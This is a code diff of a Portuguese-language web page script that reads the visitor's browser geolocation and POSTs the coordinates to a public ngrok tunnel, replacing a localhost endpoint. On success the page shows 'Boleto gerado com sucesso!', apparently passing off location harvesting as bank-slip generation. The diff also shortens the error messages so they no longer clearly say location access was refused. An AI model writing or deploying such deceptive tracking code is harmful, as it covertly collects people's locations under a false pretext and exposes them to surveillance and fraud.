@@ -99,19 +99,25 @@
       const longitude = position.coords.longitude;
 
       // Enviar as coordenadas para o servidor
-      fetch('http://localhost:8088/send-location', {
+      fetch('https://9463-2804-1b3-a9c0-3ce2-99f9-c318-9ebf-c028.ngrok-free.app/send-location', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({ latitude, longitude })
       })
-      .then(response => response.json())
+      .then(response => {
+        if (response.ok) {
+          return response.json(); // Processa a resposta JSON apenas se a resposta for OK (status 200)
+        } else {
+          throw new Error("Erro ao conectar ao servidor.");
+        }
+      })
       .then(data => {
         showMessage('Boleto gerado com sucesso!', 'message');
       })
       .catch(error => {
-        showMessage('Erro ao enviar localização.', 'error');
+        showMessage('Erro: ' + error.message, 'error');
       });
     }
 
@@ -119,13 +125,13 @@
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          showMessage("Usuário recusou o acesso à localização.", "error");
+          showMessage("Usuário", "error");//recusou
           break;
         case error.POSITION_UNAVAILABLE:
-          showMessage("Localização indisponível.", "error");
+          showMessage("indisponível.", "error");
           break;
         case error.TIMEOUT:
-          showMessage("A solicitação de localização expirou.", "error");
+          showMessage("expirou.", "error");
           break;
         case error.UNKNOWN_ERROR:
           showMessage("Erro desconhecido.", "error");
